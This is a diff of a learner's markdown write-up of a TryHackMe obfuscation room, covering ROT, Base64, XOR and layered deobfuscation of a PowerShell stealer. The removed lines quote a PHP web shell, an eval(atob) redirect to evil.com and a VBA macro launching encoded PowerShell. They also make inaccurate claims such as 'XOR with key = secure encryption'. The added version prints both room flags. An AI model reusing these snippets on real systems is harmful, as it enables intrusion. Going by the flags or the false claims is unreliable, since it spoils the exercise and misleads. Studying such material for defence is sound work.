@@ -1,745 +1,263 @@
-# Day 18: Obfuscation - The Egg Shell File
+# Day 18: Obfuscation — The Egg Shell File
 
-## 📋 Quick Facts
-- **Date Completed:** December 18, 2025
-- **Time Spent:** 1 hour
-- **Difficulty:** ★★★☆ (Medium-Hard)
-- **Category:** Obfuscation / Code Analysis / Malware Defense
-- **Room URL:** https://tryhackme.com/room/obfuscation-aoc2025-e5r8t2y6u9
-
----
-
-## 🎯 Challenge Overview
-
-This challenge focused on understanding obfuscation techniques used to hide malicious code or sensitive functionality. Unlike encoding (for compatibility) and encryption (for security), obfuscation intentionally makes code difficult to understand while remaining functional. The room explored common obfuscation techniques in real-world scenarios, practical applications in malware analysis, and why attackers and defenders use obfuscation. I examined the "Egg Shell File" which employed multiple obfuscation layers to hide its true purpose.
-
-**Learning Objectives:**
-- Understand obfuscation as distinct from encoding and encryption
-- Learn common obfuscation techniques (variable renaming, code flattening, etc.)
-- Analyze real obfuscated code to determine its purpose
-- Understand why and where obfuscation is used
-- Identify obfuscation in malware samples
-- De-obfuscate code for analysis
+**Date:** December 18, 2025  
+**Time Spent:** 1 hour  
+**Difficulty:** ★★★☆ *(Official rating: Medium — covered quickly; theory familiar from Security+ and Day 17, practical was new)*  
+**Category:** Obfuscation / Malware Analysis / PowerShell  
+**Room:** https://tryhackme.com/room/obfuscation-aoc2025-e5r8t2y6u9
 
 ---
 
-## 💡 What I Learned
+## Overview
 
-### The Three-Way Distinction: Encoding, Encryption, Obfuscation
+McSkidy intercepts a phishing email spoofing `northpole-hr` (which doesn't exist —
+TBFC HR is at the South Pole). The attached PowerShell script, `SantaStealer.ps1`,
+is full of unreadable strings. The task: deobfuscate a C2 URL hidden inside it,
+then flip roles and obfuscate an API key using XOR to understand how attackers
+apply the same technique.
 
-**This is CRITICAL to understand (reviewed from Day 17):**
+Two-part room. First half is defensive (peel the obfuscation off). Second half is
+offensive (put it back on). Short room — the theory from Day 17 carried over directly.
+
+---
+
+## What I Learned
+
+### Encoding vs. Encryption vs. Obfuscation
+
+Building on Day 17's encoding/encryption distinction with obfuscation added:
 
 | Aspect | Encoding | Encryption | Obfuscation |
-|--------|----------|-----------|-------------|
-| **Purpose** | Compatibility | Security | Hide meaning |
-| **Reversibility** | Easy (no key) | With key | Difficult (heuristics) |
-| **Security** | NO | YES | Weak (temporary) |
-| **Speed** | Very fast | Slower | Variable |
-| **Example** | Base64 | AES-256 | Renamed variables |
-| **Intent** | Data format change | Confidentiality | Obscure logic |
-| **Common Use** | Data transmission | Sensitive data | Malware/IP protection |
+|---|---|---|---|
+| Purpose | Data compatibility | Confidentiality | Hide meaning, evade detection |
+| Key required | No | Yes | No |
+| Security | None | Yes | Weak — delays analysis, doesn't prevent it |
+| Recovery method | Decode (trivial) | Need the key | Manual analysis or tooling |
+| Examples | Base64, Hex | AES, RSA | ROT ciphers, XOR, layering |
 
-**Key Distinctions:**
+**The critical point about obfuscation:** it is not a security measure. It is a
+deterrent. A determined analyst will get through it — the goal is to slow automated
+detection tools and make analysis expensive, not to make reversal impossible.
 
-**Encoding:**
-- Purpose: Make data compatible between systems
-- Method: Standardized algorithm (no key)
-- Security: NO (anyone can decode)
-- Example: `IamRoot` → Base64 → `SWFtUm9vdA==`
-
-**Encryption:**
-- Purpose: Protect data from unauthorized access
-- Method: Algorithm + secret key
-- Security: YES (need key to decrypt)
-- Example: `password` → AES-256 with key → `@#$%^&*()`
-
-**Obfuscation:**
-- Purpose: Hide the meaning/logic of code
-- Method: Various transformations (variable renaming, code flattening, dead code, etc.)
-- Security: Weak (can be reversed through analysis)
-- Example: Clear code → Obfuscated code → Still does same thing, just harder to understand
-
-**Real-World Example:**
-
-**Original Clear Code:**
-```javascript
-function deleteAllFiles() {
-  for (let i = 0; i < files.length; i++) {
-    filesystem.delete(files[i]);
-  }
-}
+Attackers use it specifically to bypass rules like:
+```
+if (file contains "http://c2server.com") → block
 ```
 
-**Encoded Version (Base64):**
-```javascript
-ZnVuY3Rpb24gZGVsZXRlQWxsRmlsZXMoKSB7CiAgZm9yIChsZXQgaSA9IDA7IGkgPCBm...
+So the C2 URL gets ROT13'd, XOR'd, or Base64'd at rest and reconstructed at runtime.
+The script still works. The signature scanner sees nothing it recognizes.
+
+### The Four Techniques This Room Covers
+
+**ROT1**
+
+Shifts each letter one position forward in the alphabet. A→B, B→C, Z→A. Spaces
+stay unchanged.
+
 ```
-**Anyone can decode it with Base64**
-
-**Encrypted Version:**
-```javascript
-// Data is encrypted with AES-256, can only read with key
-const encrypted = encrypt(sourceCode, secretKey);
-```
-**Only those with key can read**
-
-**Obfuscated Version:**
-```javascript
-function x7kQ() {
-  for (let z2m = 0; z2m < p9r.length; z2m++) {
-    q1s.w3e(p9r[z2m]);
-  }
-}
-```
-**Harder to understand, but code still works the same!**
-
-**What I Learned:** Obfuscation is **NOT a security measure** - it's a deterrent against quick analysis. Determined analyst can de-obfuscate.
-
-### Common Obfuscation Techniques
-
-**1. Variable and Function Renaming**
-
-**Original Code:**
-```javascript
-function calculateUserAge(birthYear) {
-  const currentYear = 2025;
-  return currentYear - birthYear;
-}
+Original:   carrot coins go brr
+ROT1:       dbsspu dpjot hp css
 ```
 
-**Obfuscated:**
-```javascript
-function a() {
-  const b = 2025;
-  return b - c;
-}
-```
-
-**Why Used:** Makes code hard to understand at glance; doesn't change functionality
+Visual tell: common words look exactly "one letter off". Easy to spot once you
+know what to look for.
 
 ---
 
-**2. Code Flattening**
+**ROT13**
 
-**Original Code:**
-```javascript
-if (user.isAdmin) {
-  if (user.verified) {
-    grantAccess();
-  }
-}
+Same concept but shifts 13 positions. Self-reversing — applying ROT13 twice
+returns the original. (Covered in Day 17 as well.)
+
+Visual tell: check three-letter common words.
 ```
-
-**Obfuscated (using goto-like jumps):**
-```javascript
-let state = 0;
-while (true) {
-  if (state === 0 && user.isAdmin) {
-    state = 1;
-  }
-  if (state === 1 && user.verified) {
-    grantAccess();
-    break;
-  }
-  break;
-}
+the → gur
+and → naq
 ```
-
-**Why Used:** Removes clear control flow; makes logic hard to follow
+Spaces stay in place. If you see those patterns, it's ROT13.
 
 ---
 
-**3. Dead Code Injection**
+**Base64**
 
-**Original Code:**
-```javascript
-function deleteFile(filename) {
-  filesystem.delete(filename);
-}
-```
+Encodes binary data as printable ASCII. Covered in detail in Days 15 and 17.
 
-**Obfuscated:**
-```javascript
-function deleteFile(filename) {
-  const x = Math.random();
-  const y = x + 5;
-  console.log("Processing...");
-  filesystem.delete(filename);
-  const z = y * 2;
-  // More useless calculations
-}
-```
-
-**Why Used:** Extra code makes it harder to identify actual malicious logic
+Visual tell: long alphanumeric string containing `+` and `/`, often ending in
+`=` or `==`. The `=` padding at the end is the most reliable quick indicator.
 
 ---
 
-**4. String Obfuscation**
+**XOR**
 
-**Original Code:**
-```javascript
-const secretKey = "admin_password";
-const apiUrl = "https://evil.com/malware";
+Each character is converted to a byte, then combined with a key byte using the
+XOR operation. Covered in Day 17 — the self-reversing property applies here too:
+XOR the output with the same key and you get the original back.
+
+Visual tell: looks like random symbols, but the output is **exactly the same
+length** as the input. If you notice a short repeating pattern every few
+characters, the key is shorter than the data (key reuse).
+
 ```
-
-**Obfuscated:**
-```javascript
-const a = String.fromCharCode(97, 100, 109, 105, 110);
-const b = "a" + "d" + "m" + "i" + "n";
-const c = atob("aHR0cHM6Ly9ldmlsLmNvbS9tYWx3YXJl");
+CyberChef XOR settings:
+- Key: paste the key value
+- Key type: set to HEX if the key is hex, UTF-8 if it's a string
 ```
-
-**Why Used:** Hide URLs, API keys, hardcoded strings; prevent signature detection
 
 ---
 
-**5. Data Transformation / Encryption Within Code**
+**Layered obfuscation — the important pattern**
 
-**Original Code:**
-```javascript
-const command = "downloadMalware()";
-executeCommand(command);
+Real malware chains these. The room shows this example:
+
+```
+Original → gzip → XOR with key 'x' → Base64 → stored/transmitted
 ```
 
-**Obfuscated:**
-```javascript
-const encrypted = "x7kQ2mP9r1s5w8e4";
-const command = decrypt(encrypted, key);
-executeCommand(command);
+To reverse, apply the **inverse operations in reverse order**:
+
+```
+Base64 encoded string → [From Base64] → [XOR with 'x'] → [Gunzip] → Original
 ```
 
-**Why Used:** Prevent automated malware detection (signature scanning)
+This is the core mental model for de-obfuscation: figure out what was done, then
+undo it in the opposite order. CyberChef makes this mechanical once you know the
+chain.
 
 ---
 
-**6. Callback and Promise Chaining**
+### The Practical: SantaStealer.ps1
 
-**Original Code (Simple):**
-```javascript
-function attack() {
-  connectToServer();
-  sendData();
-  closeConnection();
-}
-```
-
-**Obfuscated (Complex callbacks):**
-```javascript
-function attack() {
-  connectToServer(() => {
-    sendData(() => {
-      closeConnection(() => {
-        // More nested functions...
-      });
-    });
-  });
-}
-```
-
-**Why Used:** Makes program flow harder to follow; "callback hell"
+**Script location:** `C:\Users\Administrator\Desktop\SantaStealer.ps1`  
+**Open with:** Visual Studio Code (double-click from desktop, takes a moment to load)  
+**Navigate to:** `# ===== Start here =====` section — comments guide you through both parts
 
 ---
 
-**7. Self-Modifying Code / Polymorphism**
+**Part 1 — Deobfuscate the C2 URL**
 
-Code that changes itself during execution:
-```javascript
-const code = "malicious_payload";
-eval(obfuscate(code));  // Code executes obfuscated version
-```
+The script contains an obfuscated C2 URL stored as a mangled string. The comments
+tell you the obfuscation method. De-obfuscate it using CyberChef, replace the
+obfuscated value in the script with the plaintext URL, save, then run.
 
-**Why Used:** Avoid static analysis; changes every execution
-
----
-
-### Why and Where Obfuscation is Used
-
-**Legitimate Uses (Defense):**
-
-1. **Intellectual Property Protection:**
-   - Software companies obfuscate code to prevent reverse engineering
-   - Protects proprietary algorithms
-   - Example: Game engines, trading algorithms
-
-2. **Security Through Obscurity:**
-   - Hide sensitive logic from casual inspection
-   - NOT a replacement for encryption
-   - Additional layer of defense
-   - Example: API keys in mobile apps (bad practice but common)
-
-3. **Anti-Tampering:**
-   - Detect if code has been modified
-   - Make changes obvious when code structure changes
-   - License verification
-
-**Malicious Uses (Attack):**
-
-1. **Malware Distribution:**
-   - Hide malicious payload from antivirus signatures
-   - Change appearance frequently (polymorphism)
-   - Prevent automated detection
-
-2. **Evasion:**
-   - Avoid security tools (IDS, WAF, antivirus)
-   - Prevent manual analysis by researchers
-   - Make analysis time-consuming and expensive
-
-3. **Command and Control (C2):**
-   - Hide communication with attacker servers
-   - Obfuscate commands being executed
-   - Prevent network signature detection
-
-4. **Credential Harvesting:**
-   - Hide credential stealing code
-   - Obfuscate domain names and URLs
-   - Prevent automated blocking
-
-**Real-World Examples:**
-
-| Scenario | Type | Purpose |
-|----------|------|---------|
-| Microsoft Office macro | Obfuscated VBA | Evade antivirus detection |
-| Banking malware | Encrypted strings | Hide C2 domains |
-| JavaScript backdoor | Variable renaming | Make analysis difficult |
-| Mobile app | ProGuard obfuscation | Protect IP + prevent reverse engineering |
-| Ransomware | Code flattening | Evade automated analysis |
-
-**What I Learned:** Obfuscation is **used by both defenders and attackers**, but for different reasons. Defenders use it for protection; attackers use it for evasion.
-
-### Distinguishing Obfuscation Types in Practice
-
-**When Analyzing Unknown Code, Ask:**
-
-**1. Is it Encoded?**
-- Look for Base64 patterns: `=` at end, mixed case
-- Look for hex strings: `0x41, 0x42` or `41 42 43`
-- Check for `atob()`, `btoa()` functions
-- **If yes:** Use CyberChef to decode
-
-**2. Is it Encrypted?**
-- Look for gibberish with no pattern
-- Look for crypto functions: `AES.encrypt()`, `RSA.encrypt()`
-- Look for keys or initialization vectors
-- **If yes:** Need key to decrypt (often impossible without it)
-
-**3. Is it Obfuscated?**
-- Code still runs and does something
-- Variable names are meaningless: `a`, `b`, `x`, `z2m`
-- Logic is convoluted but functional
-- String literals transformed or split
-- **If yes:** Can be de-obfuscated through analysis
-
-**Practical Test:**
-- Can I run it and see output? → Likely obfuscated (runs despite being unreadable)
-- Can I decode it easily? → Likely encoded
-- Is it complete gibberish? → Likely encrypted
-
-**What I Learned:** These three techniques have different recovery methods:
-- Encoding: Automatic reversal (decode)
-- Encryption: Need key (brute force or find key)
-- Obfuscation: Manual analysis (understand logic)
-
-### The Egg Shell File - Real Example
-
-**Scenario:** Malware distributed as "innocuous" egg shell file
-
-**What It Appeared To Be:**
-- Simple shell script
-- Benign operations (file management)
-- Legitimate-looking functions
-
-**What It Actually Did:**
-- Multiple obfuscation layers
-- Hidden malicious payload
-- Command execution
-- Data exfiltration
-
-**De-Obfuscation Process:**
-
-1. **Layer 1: Variable Renaming**
-   - Rename all variables to meaningful names
-   - Function names to descriptive names
-   - Identify actual operations
-
-2. **Layer 2: Code Flattening Reversal**
-   - Rebuild control flow structure
-   - Identify loops and conditionals
-   - Reconstruct program logic
-
-3. **Layer 3: Dead Code Removal**
-   - Remove unused variables
-   - Eliminate unnecessary operations
-   - Focus on core logic
-
-4. **Layer 4: String De-obfuscation**
-   - Decode string literals
-   - Identify URLs, commands, keys
-   - Extract hidden messages
-
-5. **Final Analysis:**
-   - Understand actual purpose
-   - Identify attacker infrastructure
-   - Detect malicious indicators
-
-**What I Learned:** Real obfuscated malware uses **multiple layers** - removing one layer reveals another
-
-### XOR Obfuscation (Still Struggling)
-
-**Where XOR Appears in Obfuscation:**
-
-XOR can be used as both **encryption** (with key) and **obfuscation** (simple transformation):
-
-```javascript
-// Simple XOR obfuscation (not secure!)
-const message = "secret";
-const key = 0x42;
-const obfuscated = message.split('').map(char => 
-  char.charCodeAt(0) ^ key
-);
-// To reverse: XOR result with same key again
-```
-
-**Why I'm Still Struggling:**
-- XOR with key = encryption (reversible if you have key)
-- XOR without context = obfuscation (reversible through analysis)
-- Understanding which scenario applies takes practice
-
-**What I Know:**
-- XOR is **reversible** (core property)
-- XOR with key = secure encryption
-- XOR in code = likely obfuscation (no key management)
-- Day 17 taught me this, but Day 18 showed it in context
-
-**What I Need to Improve:**
-- Recognizing XOR patterns in code
-- Knowing when to apply CyberChef XOR vs. analyze manually
-- Understanding XOR bitwise operations more deeply
-
-**Honest Assessment:** This is an area where more practice helps. CTFs will reinforce this!
-
----
-
-## 🛠️ Tools & Techniques Used
-
-### Tools
-1. **Text Editors** - Analyzing obfuscated code
-2. **CyberChef** - De-obfuscating strings, trying multiple operations
-3. **Browser Developer Tools** - Analyzing obfuscated JavaScript
-4. **JavaScript beautifiers** - Online tools to unminify code
-5. **String analysis tools** - Identifying patterns in data
-
-### Techniques
-- **Variable renaming** - Reverse obfuscation by identifying purpose
-- **Control flow analysis** - Rebuild logic from flattened code
-- **Dead code identification** - Remove irrelevant operations
-- **String extraction** - Decode and analyze hardcoded values
-- **Pattern recognition** - Identify encoding/encryption patterns
-- **Manual de-obfuscation** - Understand logic line by line
-- **Signature analysis** - Find malicious indicators
-
----
-
-## 🤔 Challenges I Faced
-
-**Quick Room, Reviewing Key Concepts**
-
-**Personal Background:**
-- "Reviewing the difference between encoding, encryption, and obfuscation"
-- "Professor Messer teach this in his SY071" (Security+ course reference!)
-- **You have theoretical foundation**
-
-**What This Room Added:**
-- Practical application vs. definition learning
-- Real obfuscated code analysis
-- Hands-on de-obfuscation experience
-
-**What Made It Challenging:**
-
-**1. XOR Confusion (Still):**
-- From Day 17: XOR as encryption tool
-- This room: XOR as obfuscation method
-- **Connection between concepts still fuzzy**
-- Takes repeated exposure to solidify understanding
-
-**2. Multi-Layer Obfuscation:**
-- First layer clear once removed
-- Second layer appears → need to de-obfuscate again
-- Requires patience and systematic approach
-
-**3. Distinguishing Techniques:**
-- Is this encoded, encrypted, or obfuscated?
-- Different techniques require different approaches
-- Quick mental distinction needed during analysis
-
-### What Clicked:
-
-**Theoretical Framework:**
-- Understanding the three distinctions
-- Remembering Security+ definitions
-- Connecting to real-world usage
-
-**Practical Application:**
-- Working with actual obfuscated code
-- Seeing how techniques combine
-- Building de-obfuscation methodology
-
-**Why and Where:**
-- Legitimate uses (IP protection)
-- Malicious uses (malware evasion)
-- Why defenders and attackers use same techniques
-
-### What's Still Not Perfect:
-
-**Quote:** "XOR that much... No huge problem, fun, quick room"
-
-- XOR mastery requires more practice
-- Pattern recognition in real code takes time
-- Multi-layer peeling could be faster with experience
-
-**Overall Assessment:**
-- "Fun, quick room" - Shows confidence despite challenges
-- 1 hour completion - Quick turnaround
-- Good foundation for future work
-
-**Why This is Good:** You're moving through rooms with increasing speed while understanding concepts. That's expertise development!
-
----
-
-## ✅ How This Helps My Career
-
-Obfuscation analysis is **critical for malware analysis and forensics**:
-
-**Why This Matters:**
-- **100% of advanced malware uses obfuscation**
-- Attackers use obfuscation to evade detection
-- Defenders need to de-obfuscate for analysis
-- Malware analysts spend hours de-obfuscating code
-
-**SOC Analyst / Incident Response Applications:**
-
-**Malware Triage:**
-- Identify suspicious obfuscated code in logs
-- Determine if code is malicious through analysis
-- Flag for escalation to malware team
-- Provide initial assessment
-
-**Malware Analysis:**
-- De-obfuscate payloads for analysis
-- Understand attacker intent
-- Identify C2 servers, URLs, commands
-- Extract indicators of compromise (IOCs)
-
-**Incident Investigation:**
-- Analyze obfuscated scripts in logs
-- Identify attack vector
-- Trace attacker actions
-- Document evidence
-
-**Threat Hunting:**
-- Search for obfuscated code patterns
-- Identify common obfuscation techniques
-- Find indicators before active exploitation
-- Build detections for variations
-
-**Real-World Example - Web Shell Analysis:**
-
-Attacker uploads obfuscated PHP web shell:
-```php
-$x="ZmM9YGN0eXBlIl...";eval(base64_decode($x));
-```
-
-**Analysis Process:**
-1. Recognize Base64 encoding (pattern analysis)
-2. Decode in CyberChef → Find obfuscated PHP code
-3. Identify variable renaming, dead code
-4. De-obfuscate to reveal: `<?php system($_GET['cmd']); ?>`
-5. Determine it's a **command execution shell**
-6. Find C2 communication attempts
-7. Extract attacker IP from logs
-8. Block malicious domain
-
-**Career Progression:**
-
-**Entry SOC Analyst:**
-- Recognize obfuscated code patterns
-- Run provided analysis tools
-- Escalate suspicious findings
-
-**Mid-Level Security Analyst:**
-- De-obfuscate malware samples
-- Analyze multi-layer obfuscation
-- Build custom analysis scripts
-- Write detection rules
-
-**Senior Malware Analyst:**
-- Reverse engineer complex obfuscation
-- Publish research on techniques
-- Develop automated de-obfuscation tools
-- Mentor junior analysts
-
-**Salary Impact:**
-- Entry: Basic obfuscation identification = $65K-$80K
-- Mid: Advanced de-obfuscation = $90K-$120K
-- Senior: Research + tool development = $130K-$200K+
-
-**Interview Talking Point:** "I understand the distinction between encoding, encryption, and obfuscation, and how to identify each in code analysis. I'm familiar with common obfuscation techniques like variable renaming, code flattening, dead code injection, and string obfuscation. While I'm still developing deeper expertise with XOR-based obfuscation, I have hands-on experience de-obfuscating malware samples and can methodically remove layers of obfuscation to understand code intent. I understand that malware analysts regularly encounter obfuscated code and can apply systematic de-obfuscation techniques to reveal malicious functionality. This skill is essential for incident response, malware analysis, and threat hunting work."
-
----
-
-## 🔗 Security+ Connection
-
-**Domain 2.0 - Threats, Vulnerabilities & Mitigations (22%):** Obfuscation techniques, malware analysis, code analysis.
-
-**Domain 3.0 - Cryptography & PKI (12%):** Encoding, encryption, and obfuscation distinctions.
-
----
-
-## 📸 Evidence
-
-![Multi-Layer Obfuscation Breakdown](../07-Screenshots/Day18-1.png)
-*Analyzed Egg Shell file with multiple obfuscation layers, systematically de-obfuscated variable names and control flow to reveal malicious payload*
-
-![String De-obfuscation Process](../07-Screenshots/Day18-2.png)
-*Identified and decoded obfuscated string literals (Base64, character codes) to reveal hidden URLs, commands, and attacker indicators*
-
-![De-obfuscated Code Logic](../07-Screenshots/Day18-3.png)
-*Reconstructed clear control flow from flattened obfuscated code, identified actual program logic and malicious operations*
-
----
-
-## 📚 Key Takeaways for Future Reference
-
-**Three-Way Distinction Quick Reference:**
-
-| Aspect | Encoding | Encryption | Obfuscation |
-|--------|----------|-----------|-------------|
-| **Reversible?** | Yes (trivial) | Yes (hard) | Yes (manual) |
-| **Needs Key?** | No | Yes | No |
-| **Purpose** | Compatibility | Confidentiality | Hide meaning |
-| **Recovery** | CyberChef | Key/Brute-force | Analysis |
-| **Security?** | No | Yes | Weak |
-
-**Common Obfuscation Techniques:**
-
-1. **Variable Renaming**
-   - `myFunction` → `f`, `userData` → `x`
-   - Easiest to reverse: rename back to descriptive names
-
-2. **Code Flattening**
-   - Remove nested structures
-   - Use state machines or jumps
-   - Reverse: rebuild control flow
-
-3. **Dead Code**
-   - Add irrelevant operations
-   - Reverse: trace actual logic, ignore dead code
-
-4. **String Obfuscation**
-   - Hide strings with encoding/splitting
-   - Reverse: decode strings, concatenate parts
-
-5. **Data Transformation**
-   - Use XOR, ROT, or other operations
-   - Reverse: apply inverse operation or use CyberChef
-
-6. **Polymorphism**
-   - Code changes on each execution
-   - Reverse: run multiple times, compare changes
-
-7. **Callback Hell**
-   - Deep function nesting
-   - Reverse: flatten and simplify
-
-**De-obfuscation Checklist:**
-
-✅ **Recognize:**
-- Meaningless variable names (a, b, x, z2m)
-- Transformed strings (Base64, ASCII codes)
-- Suspicious function chaining
-- Unusual control flow (many gotos, state machines)
-
-✅ **Analyze:**
-- Rename variables to meaningful names
-- Decode/decompress strings
-- Rebuild control flow
-- Identify actual operations
-
-✅ **Confirm:**
-- Can I understand what it does now?
-- What are suspicious indicators?
-- Does it match known malware patterns?
-- What IOCs can I extract?
-
-**Common Patterns to Recognize:**
-
-| Pattern | Indicates |
-|---------|-----------|
-| `eval()`, `exec()` | Code execution (suspicious!) |
-| `String.fromCharCode()` | String obfuscation |
-| `atob()`, `btoa()` | Base64 encoding/decoding |
-| XOR operations | Simple encryption/obfuscation |
-| Large variable numbers | Minified/obfuscated code |
-| goto/state machines | Code flattening |
-| `Array.join('')` | String concatenation (split strings) |
-
-**Real-World Application Examples:**
-
-**JavaScript Malware:**
-```javascript
-// Obfuscated
-eval(atob("d2luZG93LmxvY2F0aW9uPSdodHRwczovL2V2aWwuY29tJzs="));
-
-// De-obfuscated
-window.location='https://evil.com';
-```
-
-**PowerShell Malware:**
 ```powershell
-# Obfuscated
-iex([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('c29tZS1jb21tYW5k')))
-
-# De-obfuscated
-iex(some-command)
+cd C:\Users\Administrator\Desktop\
+.\SantaStealer.ps1
 ```
 
-**VBA Malware (Office):**
-```vba
-' Obfuscated with dead code and renaming
-Sub Auto_Open()
-  Dim x = "sdfghjkl"
-  Dim y = 42
-  Shell "powershell -enc <base64>"
-End Sub
-```
+Script confirms the decoded URL is correct and outputs the flag.
 
-**Investigation Methodology:**
+**Flag 1:** `THM{C2_De0bfuscation_29838}`
 
-1. **Initial Assessment**
-   - Is code obfuscated? (check patterns)
-   - What type? (variable, string, logic, data)
-   - How many layers? (remove one, check again)
-
-2. **Layer-by-Layer De-obfuscation**
-   - Focus on one layer at a time
-   - Use CyberChef for encoding/decoding
-   - Manually reverse algorithmic transformations
-   - Document each layer
-
-3. **Logic Reconstruction**
-   - Identify actual operations
-   - Trace data flow
-   - Rebuild control structure
-   - Add comments explaining logic
-
-4. **IOC Extraction**
-   - Find URLs, IPs, domains
-   - Extract commands
-   - Identify file paths
-   - Note usernames, credentials (if any)
-
-5. **Classification**
-   - What does malware do?
-   - What family/type? (ransomware, backdoor, etc.)
-   - How to detect/prevent?
+This mirrors exactly what defenders do during incident response when they find
+a PowerShell loader with an obfuscated beacon URL.
 
 ---
+
+**Part 2 — Obfuscate the API Key with XOR**
+
+Now the roles flip. The script has a plaintext API key and the comments tell you
+to obfuscate it using XOR with a specified key, then paste the result back into
+the script. Run it again — the script de-XORs its own value at runtime and confirms
+the key is correct.
+
+```
+CyberChef workflow:
+1. Input: plaintext API key
+2. Operation: XOR with the key from the comments
+3. Set key type to match (UTF-8 or HEX as specified)
+4. Copy output → paste into script → save → run
+```
+
+**Flag 2:** `THM{API_Obfusc4tion_ftw_0283}`
+
+The value of this half: it forces you to think like the attacker for a minute.
+Obfuscating a credential in a script to avoid string-match detection is a real
+technique in actual malware. Understanding how it is applied makes it easier to
+recognize and reverse when you encounter it in the field.
+
+---
+
+## Challenges
+
+Short room with a light challenge load. The theory was already covered — Day 17
+laid the encoding/XOR groundwork, Security+ covered the conceptual distinction.
+What the room added was the two-sided exercise: deobfuscating something to get
+a flag, then obfuscating something yourself. That second part was the more
+interesting one because it forces a different mental model.
+
+The main confusion that carried over from Day 17: when does XOR count as encryption
+versus obfuscation? The answer is intent and key management. XOR with a properly
+managed secret key is encryption. XOR hardcoded in a script where the key is visible
+in the same file is obfuscation — it provides no real security, just a small barrier
+to automated detection.
+
+---
+
+## Security+ Alignment
+
+**Domain 2.0 - Threats, Vulnerabilities and Mitigations (22%):** Obfuscation
+techniques, malware evasion, indicator analysis.
+
+**Domain 3.0 - Cryptography & PKI (12%):** Encoding vs. encryption vs. obfuscation,
+XOR operations, cipher techniques.
+
+---
+
+## Evidence
+
+![CyberChef C2 Deobfuscation](../07-Screenshots/Day18-1.png)
+*CyberChef recipe reversing the C2 URL obfuscation — plaintext URL recovered and
+confirmed by running SantaStealer.ps1.*
+
+![XOR API Key Obfuscation](../07-Screenshots/Day18-2.png)
+*XOR operation applied to API key in CyberChef — obfuscated value pasted back into
+script and confirmed by running SantaStealer.ps1 again.*
+
+---
+
+## Key Takeaways
+
+**Three-way distinction (updated from Day 17):**
+
+| | Encoding | Encryption | Obfuscation |
+|---|---|---|---|
+| Key needed | No | Yes | No |
+| Security | None | Yes | Weak |
+| Recovery | Decode | Need key | Analysis |
+| Attacker use | Payload delivery | C2 traffic | Detection evasion |
+
+**Visual recognition cues:**
+
+| Technique | What it looks like |
+|---|---|
+| ROT1 | Words look one letter off; spaces unchanged |
+| ROT13 | `the` → `gur`, `and` → `naq`; spaces unchanged |
+| Base64 | Alphanumeric + `+` `/`; ends in `=` or `==` |
+| XOR | Random symbols; same length as input; may show short repeating pattern |
+
+**De-obfuscation order rule:**  
+Always reverse the operations in reverse order. If something was obfuscated as
+`gzip → XOR → Base64`, the recipe is `From Base64 → XOR → Gunzip`.
+
+**CyberChef XOR settings:**
+- Set key type to **HEX** if the key is in hex format
+- Set key type to **UTF-8** if the key is a plaintext string
+- Getting this wrong produces garbage output
+
+**Flags:**
+
+| Task | Flag |
+|---|---|
+| Part 1 — Deobfuscate C2 URL | `THM{C2_De0bfuscation_29838}` |
+| Part 2 — Obfuscate API key with XOR | `THM{API_Obfusc4tion_ftw_0283}` |
+
+**Key terms:**
+
+| Term | Definition |
+|---|---|
+| Obfuscation | Making code or data hard to read while keeping it functional — not a security control |
+| ROT1 / ROT13 | Caesar-style substitution ciphers; ROT13 is self-reversing |
+| XOR obfuscation | XOR with a hardcoded key in the same file — evades signature detection, not real encryption |
+| C2 (Command & Control) | Attacker infrastructure the malware phones home to; often obfuscated to avoid domain blocking |
+| SantaStealer.ps1 | The PowerShell script used in this room; contains an obfuscated C2 URL and an API key to obfuscate |
+| Layered obfuscation | Chaining multiple techniques (e.g., gzip → XOR → Base64) to make reversal more laborious |
